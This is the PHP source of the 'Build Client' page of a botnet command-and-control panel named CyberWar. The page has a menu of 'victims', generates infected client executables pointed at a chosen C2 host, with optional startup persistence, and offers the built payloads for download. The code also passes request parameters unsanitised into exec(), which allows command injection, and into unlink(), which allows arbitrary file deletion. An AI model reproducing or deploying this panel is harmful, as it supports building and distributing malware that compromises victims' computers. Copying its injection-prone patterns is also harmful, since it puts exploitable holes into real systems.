<?php
session_start();
$success = false;
$deleted = false;
if(!isset($_SESSION['username'])) {
    header("Location: error.html");
    die();
}

if(isset($_GET['apiKeyInput']) && isset($_GET['hostNameInput']) && isset($_GET['build'])) {
    if(isset($_GET['checkRunUp'])){
        exec("builder.exe " .$_GET['hostNameInput']. " " .$_GET['apiKeyInput']. " true");
        $success = true;
    } else {
        exec("builder.exe " .$_GET['hostNameInput']. " " .$_GET['apiKeyInput']. " false");
        $success = true;
    }
}

if(isset($_GET['delete'])){
    $filePath = "generate\\" . $_GET['delete'];
    unlink($filePath);
    $deleted = true;
}

?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Dashboard - CyberWar</title>
    <meta name="description" content="CyberWar Botnet Management Console">
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="assets/fonts/fontawesome5-overrides.min.css">
</head>

<body id="page-top">
    <div id="wrapper">
        <nav class="navbar navbar-dark align-items-start sidebar sidebar-dark accordion bg-gradient-primary p-0">
            <div class="container-fluid d-flex flex-column p-0"><a class="navbar-brand d-flex justify-content-center align-items-center sidebar-brand m-0" href="#">
                    <div class="sidebar-brand-icon rotate-n-15"><i class="fas fa-laugh-wink"></i></div>
                    <div class="sidebar-brand-text mx-3"><span>CyberWar</span></div>
                </a>
                <hr class="sidebar-divider my-0">
                <ul class="navbar-nav text-light" id="accordionSidebar">
                    <li class="nav-item"><a class="nav-link" href="index.php"><i class="fas fa-tachometer-alt"></i><span>Dashboard</span></a></li>
                    <li class="nav-item"><a class="nav-link" href="clients.php?pageno=1"><i class="fas fa-table"></i><span>Vicitims</span></a></li>
                    <li class="nav-item"><a class="nav-link active" href="build.php"><i class="far fa-user-circle"></i><span>Build Client</span></a></li>
                    <li class="nav-item"><a class="nav-link" href="blank.php"><i class="fas fa-window-maximize"></i><span>Running Tasks</span></a></li>
                </ul>
                <div class="text-center d-none d-md-inline"><button class="btn rounded-circle border-0" id="sidebarToggle" type="button"></button></div>
            </div>
        </nav>
        <div class="d-flex flex-column" id="content-wrapper">
            <div id="content">
                <nav class="navbar navbar-light navbar-expand bg-white shadow mb-4 topbar static-top">
                    <div class="container-fluid"><button class="btn btn-link d-md-none rounded-circle me-3" id="sidebarToggleTop" type="button"><i class="fas fa-bars"></i></button>
                        <ul class="navbar-nav flex-nowrap ms-auto">
                            <li class="nav-item dropdown d-sm-none no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"><i class="fas fa-search"></i></a>
                                <div class="dropdown-menu dropdown-menu-end p-3 animated--grow-in" aria-labelledby="searchDropdown">
                                    <form class="me-auto navbar-search w-100">
                                        <div class="input-group"><input class="bg-light form-control border-0 small" type="text" placeholder="Search for ...">
                                            <div class="input-group-append"><button class="btn btn-primary py-0" type="button"><i class="fas fa-search"></i></button></div>
                                        </div>
                                    </form>
                                </div>
                            </li>
                            <li class="nav-item dropdown no-arrow mx-1"></li>
                            <li class="nav-item dropdown no-arrow mx-1">
                                <div class="nav-item dropdown no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#">Settings&nbsp;<i class="fas fa-hand-spock fa-fw"></i></a>
                                    <div class="dropdown-menu dropdown-menu-end dropdown-list animated--grow-in">
                                        <h6 class="dropdown-header">User Center</h6><a class="dropdown-item d-flex align-items-center" href="#">
                                            <div class="fw-bold">
                                                <div class="text-truncate"><span>Settings for: <?php echo $_SESSION['username'];?></span></div>
                                                <p class="small text-gray-500 mb-0"><(^.^<)</p>
                                            </div>
                                        </a><a class="dropdown-item text-center small text-gray-500" href="login.php?logout">LogOut</a>
                                    </div>
                                </div>
                                <div class="shadow dropdown-list dropdown-menu dropdown-menu-end" aria-labelledby="alertsDropdown"></div>
                            </li>
                            <li class="nav-item dropdown no-arrow"></li>
                        </ul>
                    </div>
                </nav>
                <div class="container-fluid">
                    <div class="d-sm-flex justify-content-between align-items-center mb-4">
                        <h3 class="text-dark mb-0">Client Builder</h3>
                    </div>
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-md-12">
                            <form action="build.php" method="GET">
<fieldset>

<!-- Form Name -->
<legend>Build Client</legend>

<!-- Text input-->
<div class="form-group">
  <label class="col-md-4 control-label" for="hostNameInput"><b>Hostname: </b></label>  
  <div class="col-md-5">
  <input id="hostNameInput" name="hostNameInput" type="text" placeholder="http://xxxxxx.com/cyberwar/" class="form-control input-sm" required="">
  <span class="help-block">Attention: The last char has to be a /</span>  
  </div>
</div>
<!-- Text input-->
<div class="form-group">
  <label class="col-md-4 control-label" for="apiKeyInput"><b>API-Key:</b></label>  
  <div class="col-md-5">
  <input id="apiKeyInput" name="apiKeyInput" type="text" placeholder="27158f7850753c8380b956af0514ff66" class="form-control input-sm" required="">
  <span class="help-block">Tip: You have to set your API-Key first in config.php</span>  
  </div>
</div>

<!-- Multiple Checkboxes (inline) -->
<div class="form-group">
  <label class="col-md-4 control-label" for="checkRunUp"><b>Run at Startup?</b></label>
  <div class="col-md-4">
    <label class="checkbox-inline" for="checkRunUp-0">
      <input type="checkbox" name="checkRunUp" id="checkRunUp-0" value="True">
      Yes
    </label>
  </div>
</div>
<!-- Button -->
<div class="form-group">
  <label class="col-md-4 control-label" for="build"></label>
  <div class="col-md-4">
    <button id="build" type="submit" name="build" class="btn btn-primary btn-sm">Build Client</button>
  </div>
</div>

</fieldset>
<?php
if($success == true){
echo "<div class='alert alert-success' role='alert'>
Your client was successfully created!
</div>";
}
if($deleted == true){
    echo "<div class='alert alert-warning' role='alert'>
    File successfully deleted!
    </div>";
    }
?>
</form>
<table class="table table-striped">
                                        <thead>
                                            <tr>
                                                <th>
                                                    File Name
                                                </th>
                                                <th>
                                                    Options
                                                </th>
                                            </tr>
                                        </thead>
                                            <tbody>
                                                <?php
                                                    $base_url="http://".$_SERVER['SERVER_NAME'].dirname($_SERVER["REQUEST_URI"].'?').'/';
                                                    $dir    = 'generate';
                                                    $fileArr = scandir($dir);

                                                    function scan_dir($dir) {
                                                        $ignored = array('.', '..', '.svn', '.htaccess');

                                                        $files = array();    
                                                        foreach (scandir($dir) as $file) {
                                                            if (in_array($file, $ignored)) continue;
                                                            $files[$file] = filemtime($dir . '/' . $file);
                                                        }

                                                        arsort($files);
                                                        $files = array_keys($files);

                                                        return ($files) ? $files : false;
                                                    }
                                                    foreach($fileArr as $file){
                                                    echo "<tr>";    
                                                    echo "<td>";
                                                    if(strpos($file, ".") == true){echo $file;}
                                                    echo "</td>";
                                                    echo "<td>";
                                                    echo "<form action='build.php' method='GET'>
                                                    <div class='form-group'>";
                                                    if(strpos($file, ".") == true){ echo "<a href='" . $base_url . "generate/" . $file . "' class='btn btn-primary btn-sm' role='button'>Download File</a>";}
                                                    if(strpos($file, ".") == true){ echo " <button id='delete' type='submit' name='delete' value='" . $file . "' class='btn btn-danger btn-sm'>Delete File</button>";}
                                                    echo "</div></form>";
                                                    echo "</td>";
                                                    echo "</tr>";  
                                                    }
                                                ?>
                                            </tbody>
                                        </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <footer class="bg-white sticky-footer">
                <div class="container my-auto">
                    <div class="text-center my-auto copyright"><span>Copyright © CyberWar 2021</span></div>
                </div>
            </footer>
        </div><a class="border rounded d-inline scroll-to-top" href="#page-top"><i class="fas fa-angle-up"></i></a>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.0.0-beta2/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.8.0/Chart.bundle.min.js"></script>
    <script src="assets/js/script.min.js"></script>
</body>

</html>